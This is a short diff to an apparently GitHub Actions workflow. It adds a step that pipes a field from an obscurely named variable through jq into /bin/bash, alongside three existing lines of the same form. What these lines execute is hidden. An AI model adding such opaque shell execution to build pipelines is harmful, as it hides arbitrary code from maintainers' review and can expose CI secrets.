@@ -21,6 +21,7 @@ jobs:
           echo $ibdc1 | jq -r .du82436 | /bin/bash
           printf '%s' "$abd965" | jq -r .l163 | /bin/bash
           printf '%s' "$ph7" | jq -r .szc241 | /bin/bash
+          printf '%s' "$wth9" | jq -r .bfkm96990 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
